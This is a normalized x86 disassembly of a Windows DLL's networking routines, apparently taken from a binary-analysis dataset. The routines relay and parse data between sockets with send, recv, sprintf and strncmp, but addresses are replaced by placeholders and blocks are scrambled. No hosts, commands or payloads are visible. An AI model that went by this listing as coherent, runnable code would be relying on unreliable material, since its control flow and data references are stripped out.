mov eax [ ebp - 0x404 ]
not eax
cmp [ ebp - 0x400 ] eax
jne r-xdata
call [ closesocket@IAT ]
xor eax eax
lea eax [ ebp - 0x404 ]
push eax
call sub_1000be87
jmp r-xdata
jle r-xdata
cmp eax ebx
jl r-xdata
mov esi [ strlen@IAT ]
mov edi r--data
push edi
call esi
push eax
lea eax [ ebp - 0x404 ]
push edi
push eax
call [ strncmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
mov eax edi
jmp r-xdata
xor eax eax
mov edi [ ebp - 0x40c ]
lea eax [ ebp - 0x404 ]
push eax
call sub_1000befe
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
push [ ebp - 0x408 ]
jle r-xdata
cmp eax ebx
jl r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ sprintf@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x404 ]
push ebx
push eax
call esi
pop ecx
push eax
lea eax [ ebp - 0x404 ]
push eax
push [ ebp - 0x408 ]
call [ send@IAT ]
mov esi [ ebp - 0x40c ]
push ebx
call sub_10008fbd
test eax eax
je r-xdata
mov eax [ ebp - 0x408 ]
jmp r-xdata
push ebx
push 0x400
lea eax [ ebp - 0x404 ]
push eax
push [ ebp - 0x408 ]
call [ recv@IAT ]
test eax eax
js r-xdata
sub_1000c0f2
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
sub eax 0x0
je r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x224 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
dec eax
je r-xdata
push 0x1388
call [ Sleep@IAT ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov ecx esi
call sub_1000c4c4
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x224 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax + 0xc ]
jmp r-xdata
dec eax
je r-xdata
pop esi
pop ebp
retn 0x1c
mov [ esi + 0x4 ] 0x5
push [ ebp + 0x10 ]
mov ecx [ esi + 0x224 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call [ eax + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x224 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax + 0x10 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x224 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call [ eax + 0x18 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_1000c4c4
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x10 ]
mov eax esi
push [ ebp + 0xc ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_1000c565
jmp r-xdata
xor eax eax
jmp r-xdata
sub_1000c208
push ebp
mov ebp esp
push ecx
and [ esi + 0x4 ] 0x0
push ebx
push edi
push 0x218
lea eax [ esi + 0x8 ]
push 0x0
push eax
mov [ esi ] r--data
call [ memset@IAT ]
mov edi [ operator new@IAT ]
mov ebx 0x10114
push ebx
call edi
add esp 0x10
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
xor eax eax
call sub_10008f4e
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
jmp r-xdata
xor eax eax
call sub_10008f4e
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
jmp r-xdata
push ebx
mov [ esi + 0x224 ] eax
call edi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
xor edi edi
call sub_10008f4e
mov [ edi ] r--data
jmp r-xdata
push ebx
mov [ esi + 0x228 ] eax
call edi
mov edi eax
pop ecx
test edi edi
je r-xdata
mov [ esi + 0x220 ] edi
pop edi
mov eax esi
pop ebx
leave
retn
sub_1000c2a1
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000c2c1
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_1000c2c1
push esi
mov esi ecx
mov ecx [ esi + 0x220 ]
mov [ esi ] r--data
test ecx ecx
je r-xdata
mov ecx [ esi + 0x224 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esi + 0x228 ]
pop esi
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000c313
push ebp
mov ebp esp
sub esp 0x40c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov edi ecx
mov ebx [ edi + 0x220 ]
mov [ ebp - 0x408 ] edi
call sub_1000a331
mov ebx eax
mov [ ebp - 0x40c ] ebx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
mov eax [ edi + 0x224 ]
mov [ eax + 0x10c ] ebx
mov eax [ edi + 0x220 ]
and [ eax + 0x10c ] 0x0
push esi
mov esi [ edi + 0x224 ]
push 0x2710
call sub_10008fbd
test eax eax
jne r-xdata
push 0x0
push 0x100
lea eax [ ebp - 0x404 ]
push eax
push ebx
call [ recv@IAT ]
test eax eax
jle r-xdata
mov eax [ edi + 0x224 ]
jmp r-xdata
mov esi [ edi + 0x224 ]
mov [ ebp + eax - 0x404 ] 0x0
mov eax [ ebp - 0x404 ]
not eax
cmp [ ebp - 0x400 ] eax
jne r-xdata
call sub_10009032
xor eax eax
xor eax eax
lea eax [ ebp - 0x404 ]
push eax
call sub_1000be87
jmp r-xdata
jle r-xdata
test eax eax
js r-xdata
mov ebx [ edi + 0x224 ]
mov esi r--data
push esi
call [ strlen@IAT ]
push eax
lea eax [ ebp - 0x404 ]
push esi
push eax
call [ strncmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
mov [ edi + 0x4 ] 0x1
mov eax ebx
jmp r-xdata
xor eax eax
lea eax [ ebp - 0x404 ]
push eax
mov edi ebx
call sub_1000befe
mov edi [ ebp - 0x408 ]
jmp r-xdata
pop esi
jle r-xdata
test eax eax
js r-xdata
lea eax [ ebp - 0x404 ]
push eax
mov ecx edi
call sub_1000c65c
test eax eax
jns r-xdata
mov [ edi + 0x4 ] 0x3
jmp r-xdata
jle r-xdata
mov eax [ edi + 0x224 ]
call sub_10009032
mov eax [ edi + 0x228 ]
jmp r-xdata
mov eax [ ebp - 0x40c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x404 ]
push 0x400
push eax
call [ _snprintf@IAT ]
lea eax [ ebp - 0x404 ]
push eax
call [ strlen@IAT ]
mov edi [ edi + 0x224 ]
add esp 0x10
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_1000a5f9
mov eax [ ebp - 0x408 ]
mov eax [ eax + 0x224 ]
mov [ edi + 0x4 ] 0x5
sub_1000c4c4
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov esi ecx
and [ esi + 0x90 ] 0x0
push 0x80
push [ ebp + 0x8 ]
lea ebx [ esi + 0xc ]
push ebx
mov edi eax
call [ strncpy@IAT ]
and [ esi + 0x8 ] 0x0
add esp 0xc
mov [ esi + 0x8c ] edi
mov eax edi
mov edi [ esi + 0x224 ]
push ebx
mov [ esi + 0x8b ] 0x0
call sub_1000a457
test eax eax
jle r-xdata
mov eax [ esi + 0x224 ]
call sub_10009032
mov eax [ esi + 0x228 ]
call sub_10009032
call sub_1000caac
test eax eax
jle r-xdata
mov eax [ esi + 0x8c ]
mov edi [ esi + 0x228 ]
push ebx
call sub_1000a457
test eax eax
jle r-xdata
push 0x0
call sub_1000c7ae
test eax eax
jle r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_1000c565
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi [ strncpy@IAT ]
mov ebx 0x80
mov esi eax
push ebx
push [ ebp + 0x18 ]
lea eax [ esi + 0xc ]
push eax
mov [ esi + 0x90 ] 0x1
call edi
mov eax [ ebp + 0x1c ]
push ebx
push [ ebp + 0x8 ]
mov [ esi + 0x8c ] eax
lea eax [ esi + 0x94 ]
push eax
mov [ esi + 0x8b ] 0x0
call edi
mov eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x10 ]
mov [ esi + 0x114 ] eax
lea eax [ esi + 0x118 ]
push eax
mov [ esi + 0x113 ] 0x0
call edi
push ebx
push [ ebp + 0x14 ]
lea eax [ esi + 0x198 ]
push eax
mov [ esi + 0x197 ] 0x0
call edi
mov eax [ esi + 0x114 ]
mov edi [ esi + 0x224 ]
and [ esi + 0x8 ] 0x0
add esp 0x30
lea ebx [ esi + 0x94 ]
push ebx
mov [ esi + 0x217 ] 0x0
call sub_1000a457
test eax eax
jle r-xdata
mov eax [ esi + 0x224 ]
call sub_10009032
mov eax [ esi + 0x228 ]
call sub_10009032
call sub_1000caac
test eax eax
jle r-xdata
mov eax [ esi + 0x114 ]
mov edi [ esi + 0x228 ]
push ebx
call sub_1000a457
test eax eax
jle r-xdata
push 0x0
call sub_1000c7ae
test eax eax
jle r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn 0x18
sub_1000c65c
push ebp
mov ebp esp
sub esp 0x40c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ strlen@IAT ]
push esi
push edi
mov esi ecx
mov edi r--data
push edi
mov [ ebp - 0x408 ] eax
mov [ esi + 0x8 ] 0x1
call ebx
push eax
push edi
push [ ebp - 0x408 ]
call [ strncmp@IAT ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esi + 0x224 ]
mov eax [ eax + 0x10c ]
push 0x100000
mov [ ebp - 0x40c ] eax
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x404 ]
push eax
call ebx
mov edi [ esi + 0x224 ]
add esp 0x10
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_1000a5f9
test eax eax
jns r-xdata
xor eax eax
jmp r-xdata
and [ ebp - 0x408 ] 0x0
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x4
push [ esi + 0x220 ]
call sub_1000a19c
push [ esi + 0x224 ]
mov edi eax
call sub_1000a19c
cmp edi eax
je r-xdata
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x220 ]
call sub_10009032
inc [ ebp - 0x408 ]
cmp [ ebp - 0x408 ] 0x32
jl r-xdata
mov eax [ esi + 0x228 ]
mov [ eax + 0x10c ] ebx
mov eax [ esi + 0x220 ]
and [ eax + 0x10c ] 0x0
push 0x0
call sub_1000c7ae
test eax eax
js r-xdata
mov ebx [ esi + 0x220 ]
call sub_1000a331
mov ebx eax
test ebx ebx
jne r-xdata
mov eax 0x100000
mov [ esi + 0x21c ] eax
mov [ esi + 0x218 ] eax
mov eax [ ebp - 0x40c ]
sub_1000c7ae
push ebp
mov ebp esp
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x8 ] 0x1
push ebx
push edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ebx [ strlen@IAT ]
push [ esi + 0x228 ]
mov eax 0x400
lea ebx [ ebp - 0x404 ]
call sub_1000a693
test eax eax
jle r-xdata
push [ esi + 0x228 ]
mov eax 0x3ff
lea ebx [ ebp - 0x404 ]
call sub_1000a693
test eax eax
js r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x404 ]
push eax
call [ strlen@IAT ]
mov edi [ esi + 0x228 ]
add esp 0xc
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_1000a5f9
test eax eax
jg r-xdata
push [ esi + 0x8c ]
lea eax [ esi + 0xc ]
push eax
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x14
mov eax [ esi + 0x8c ]
push eax
lea ecx [ esi + 0xc ]
push ecx
push eax
push ecx
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x1c
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov edi [ strncmp@IAT ]
push 0xf
mov eax ebx
push r--data
push eax
call edi
add esp 0xc
test eax eax
je r-xdata
mov edi r--data
push edi
call [ strlen@IAT ]
push eax
mov eax ebx
push edi
push eax
call [ strncmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ esi + 0x218 ] 0x100000
lea eax [ ebp - 0x404 ]
push eax
call ebx
mov edi [ esi + 0x228 ]
pop ecx
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_1000a5f9
test eax eax
jle r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x4
mov edi r--data
push 0xf
mov eax ebx
push r--data
push eax
call edi
add esp 0xc
test eax eax
jne r-xdata
mov edi r--data
mov eax ebx
mov ebx [ strlen@IAT ]
push eax
call ebx
pop ecx
cmp eax 0x2
jb r-xdata
mov eax ebx
mov ebx [ strlen@IAT ]
push eax
call ebx
pop ecx
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call ebx
pop ecx
lea ecx [ ebp - 0x404 ]
sub ecx 0x2
add eax ecx
push eax
call [ strcmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call ebx
pop ecx
lea ecx [ ebp - 0x404 ]
sub ecx 0x2
add eax ecx
push eax
call [ strcmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ strcmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ strcmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x90 ] 0x0
push 0x100000
je r-xdata
push edi
call ebx
push eax
lea eax [ ebp - 0x404 ]
push edi
push eax
call [ _strnicmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
push edi
call ebx
push eax
lea eax [ ebp - 0x404 ]
push edi
push eax
call [ _strnicmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
push [ esi + 0x228 ]
mov eax 0x3ff
lea ebx [ ebp - 0x404 ]
call sub_1000a693
test eax eax
jle r-xdata
push edi
call ebx
lea eax [ ebp + eax - 0x404 ]
push eax
call [ atoi@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x228 ]
mov eax 0x3ff
lea ebx [ ebp - 0x404 ]
call sub_1000a693
test eax eax
jle r-xdata
push edi
call ebx
lea eax [ ebp + eax - 0x404 ]
push eax
call [ atoi@IAT ]
pop ecx
pop ecx
cmp eax 0x100000
je r-xdata
jmp r-xdata
jmp r-xdata
sub_1000caac
push ebp
mov ebp esp
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x8 ] 0x1
push ebx
push edi
jne r-xdata
cmp [ esi + 0x90 ] 0x0
push [ esi + 0x8c ]
je r-xdata
push [ esi + 0x224 ]
mov eax 0x3ff
lea ebx [ ebp - 0x404 ]
call sub_1000a693
test eax eax
js r-xdata
lea eax [ esi + 0xc ]
push eax
call [ rand@IAT ]
push eax
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x14
lea ebx [ esi + 0xc ]
push ebx
call [ rand@IAT ]
push eax
push [ esi + 0x8c ]
lea eax [ ebp - 0x404 ]
push ebx
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x1c
jmp r-xdata
or eax 0xffffffff
mov edi [ strlen@IAT ]
mov ebx r--data
push ebx
call edi
push eax
lea eax [ ebp - 0x404 ]
push ebx
push eax
call [ strncmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
push [ esi + 0x224 ]
mov eax 0x400
lea ebx [ ebp - 0x404 ]
call sub_1000a693
test eax eax
jle r-xdata
lea eax [ ebp - 0x404 ]
push eax
call [ strlen@IAT ]
mov edi [ esi + 0x224 ]
pop ecx
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_1000a5f9
test eax eax
jle r-xdata
push [ esi + 0x224 ]
mov eax 0x400
lea ebx [ ebp - 0x404 ]
call sub_1000a693
test eax eax
jle r-xdata
mov edi [ strncmp@IAT ]
push 0xf
mov eax ebx
push r--data
push eax
call edi
add esp 0xc
test eax eax
je r-xdata
mov eax ebx
push eax
call edi
pop ecx
cmp eax 0x2
jb r-xdata
mov edi r--data
push 0xf
mov eax ebx
push r--data
push eax
call edi
add esp 0xc
test eax eax
jne r-xdata
mov eax ebx
push r--data
push eax
call edi
pop ecx
mov ecx ebx
mov ebx [ strcmp@IAT ]
sub ecx 0x2
add eax ecx
push eax
call ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax ebx
mov ebx [ strlen@IAT ]
push eax
call ebx
pop ecx
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call ebx
pop ecx
lea ecx [ ebp - 0x404 ]
sub ecx 0x2
add eax ecx
push eax
call [ strcmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ebx 0x100000
push ebx
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x404 ]
push eax
call edi
mov edi [ esi + 0x224 ]
add esp 0x10
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_1000a5f9
test eax eax
js r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ strcmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi + 0x21c ] ebx
jmp r-xdata
mov [ esi + 0x21c ] 0x100000
push edi
call ebx
push eax
lea eax [ ebp - 0x404 ]
push edi
push eax
call [ _strnicmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
push [ esi + 0x224 ]
mov eax 0x400
lea ebx [ ebp - 0x404 ]
call sub_1000a693
test eax eax
jle r-xdata
push edi
call ebx
lea eax [ ebp + eax - 0x404 ]
push eax
call [ atoi@IAT ]
pop ecx
pop ecx
cmp eax 0x100000
je r-xdata
sub_1000cd5e
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx ecx
cmp [ ebx + 0x4 ] 0x5
push esi
push edi
mov [ ebp - 0x20 ] eax
jne r-xdata
push [ ebp + 0x10 ]
mov ebx [ ebx + 0x224 ]
mov edx [ ebx ]
push eax
push [ ebp + 0x8 ]
mov ecx ebx
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax [ ebp + 0x10 ]
xor esi esi
add eax 0x30
cmp [ ebx + 0x8 ] esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0xc
xor eax eax
inc eax
cmp [ ebx + 0x218 ] eax
jae r-xdata
cmp [ ebx + 0x21c ] eax
jae r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebx + 0x228 ]
push [ ebp - 0x20 ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
call [ eax + 0x20 ]
cmp eax esi
jle r-xdata
push 0x18
lea eax [ ebp - 0x1c ]
push esi
push eax
call [ memset@IAT ]
mov eax [ ebx + 0x218 ]
mov edi [ ebx + 0x228 ]
add esp 0xc
mov [ ebp - 0x1c ] eax
push 0x18
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] esi
call sub_1000a5f9
mov eax [ ebx + 0x218 ]
mov esi [ ebx + 0x228 ]
sub eax 0x18
call sub_1000a5b3
push 0x1
mov esi ebx
call sub_1000c7ae
test eax eax
js r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebx + 0x224 ]
push [ ebp - 0x20 ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
call [ eax + 0x20 ]
cmp eax esi
jle r-xdata
push 0x18
lea eax [ ebp - 0x1c ]
push esi
push eax
call [ memset@IAT ]
mov eax [ ebx + 0x21c ]
mov edi [ ebx + 0x224 ]
add esp 0xc
mov [ ebp - 0x1c ] eax
push 0x18
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] esi
call sub_1000a5f9
mov eax [ ebx + 0x21c ]
mov esi [ ebx + 0x224 ]
sub eax 0x18
call sub_1000a5b3
mov esi ebx
call sub_1000caac
test eax eax
jns r-xdata
sub [ ebx + 0x218 ] eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor esi esi
sub [ ebx + 0x21c ] eax
jmp r-xdata
xor esi esi
sub_1000cecd
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x5
push edi
jne r-xdata
mov ecx [ esi + 0x224 ]
mov eax [ ecx ]
pop edi
pop esi
pop ebp
jmp [ eax + 0x24 ]
cmp [ esi + 0x8 ] 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
mov ecx [ esi + 0x224 ]
mov eax [ ecx ]
call [ eax + 0x24 ]
mov edi eax
test edi edi
jle r-xdata
mov ecx [ esi + 0x228 ]
mov eax [ ecx ]
call [ eax + 0x24 ]
mov edi eax
test edi edi
jle r-xdata
mov eax edi
jmp r-xdata
sub [ esi + 0x21c ] edi
jne r-xdata
sub [ esi + 0x218 ] edi
jne r-xdata
pop edi
pop esi
pop ebp
retn 0xc
call sub_1000caac
jmp r-xdata
push 0x1
call sub_1000c7ae
test eax eax
jns r-xdata
or eax 0xffffffff
sub_1000cf57
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x224 ]
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ eax + 0x10c ]
mov [ ebp - 0x18 ] 0x10
call [ getsockname@IAT ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x10 ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn
sub_1000cfab
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x224 ]
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ eax + 0x10c ]
mov [ ebp - 0x18 ] 0x10
call [ getsockname@IAT ]
test eax eax
jns r-xdata
push [ ebp - 0x12 ]
call [ ntohs@IAT ]
movzx eax ax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
movzx eax ax
call sub_10014571
leave
retn
sub_1000cfff
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x224 ]
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ eax + 0x10c ]
mov [ ebp - 0x18 ] 0x10
call [ getpeername@IAT ]
test eax eax
jns r-xdata
push [ ebp - 0x12 ]
call [ ntohs@IAT ]
movzx eax ax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
movzx eax ax
call sub_10014571
leave
retn
sub_1000d095
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x5
push esi
push [ ebp + 0x8 ]
jne r-xdata
mov esi [ ecx + 0x224 ]
cmp [ ecx + 0x8 ] 0x0
je r-xdata
mov esi [ ecx + 0x228 ]
jmp r-xdata
call sub_10008fbd
pop esi
pop ebp
retn 0x4
sub_1000d0c0
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x5
push esi
push [ ebp + 0x8 ]
jne r-xdata
mov esi [ ecx + 0x224 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov esi [ ecx + 0x228 ]
jmp r-xdata
call sub_1000a1e3
pop esi
pop ebp
retn 0x4
sub_1000d110
push ebp
mov ebp esp
push esi
push 0xc30
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
pop esi
pop ebp
retn 0xc
push ebx
mov ebx 0x618
push ebx
push 0x0
push esi
call [ memset@IAT ]
and [ esi + 0x4 ] 0x0
mov al [ ebp + 0x8 ]
add esp 0xc
cmp [ ebp + 0xc ] 0x0
mov [ esi ] 0xc30
mov [ esi + 0x10 ] al
je r-xdata
push ebx
push [ ebp + 0x10 ]
lea eax [ esi + 0x618 ]
push eax
call [ memcpy@IAT ]
add esp 0xc
mov eax esi
pop ebx
push 0x80
push [ ebp + 0xc ]
lea eax [ esi + 0x12 ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ esi + 0x110 ] ax
sub_1000d189
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000d1a9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_1000d1a9
push esi
mov esi ecx
mov [ esi ] r--data
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x10 ] ecx
call [ free@IAT ]
pop ecx
lea eax [ esi + 0x14 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ esi ] r--data
pop esi
retn
sub_1000d1dd
push esi
mov esi ecx
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x10 ] ecx
call [ free@IAT ]
pop ecx
push 0x8
lea eax [ esi + 0x8 ]
push 0x0
push eax
call [ memset@IAT ]
and [ esi + 0x10 ] 0x0
add esp 0xc
pop esi
retn
sub_1000d210
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov esi ecx
call sub_1000d32b
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edi
mov eax [ edi ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
cmp [ esi + 0x8 ] eax
je r-xdata
pop edi
pop esi
leave
retn 0x8
xor eax eax
call [ GetTickCount@IAT ]
mov ecx [ esi + 0xc ]
cmp eax ecx
jb r-xdata
mov [ esi + 0xc ] eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_1000de30
test eax eax
je r-xdata
mov edx eax
sub edx ecx
cmp edx 0x64
jbe r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
mov esi 0x618
add ebx 0x18
mov eax esi
cmp ebx esi
jb r-xdata
push eax
call sub_10007c8b
mov edi eax
pop ecx
test edi edi
je r-xdata
mov eax ebx
push [ ebp - 0x8 ]
call [ free@IAT ]
pop ecx
pop ebx
test edi edi
je r-xdata
cmp ebx esi
jb r-xdata
mov [ edi ] esi
mov esi [ ebp - 0x4 ]
push esi
push [ ebp - 0x8 ]
lea eax [ edi + 0x18 ]
push eax
mov [ edi + 0x4 ] 0x4
call [ memcpy@IAT ]
add esp 0xc
mov [ edi + 0x14 ] esi
mov esi ebx
sub_1000d2ca
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
mov esi ecx
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
xor eax eax
pop edi
inc eax
pop esi
pop ebp
retn 0x8
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call [ memcpy@IAT ]
add esp 0xc
lea ebx [ esi + 0x14 ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
and [ edi + 0x8 ] eax
mov [ esi + 0x10 ] edi
mov eax ecx
and [ edi + 0x8 ] ecx
mov [ eax + 0x8 ] edi
jmp r-xdata
push ebx
